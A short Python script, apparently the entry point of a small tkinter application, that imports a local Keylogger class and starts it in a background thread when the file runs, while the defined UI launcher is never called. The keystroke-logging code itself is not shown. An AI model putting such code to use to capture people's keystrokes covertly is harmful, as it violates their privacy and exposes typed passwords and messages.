import tkinter as tk
from threading import Thread
from ui import Application
from logger import Keylogger

MINUTES_IN_YEAR = 525949.2
MINUTES_IN_MONTH = 43829.1
MINUTES_IN_DAY = 1440
MINUTES_IN_HOUR = 60

logging = True

def start_app():
    root = tk.Tk()
    app = Application(master=root)
    app.mainloop()


def start_logging():
    log = Keylogger(logging)
    log.start_logging()


keylogger = Thread(name='Keylogger', target=start_logging)

keylogger.start()
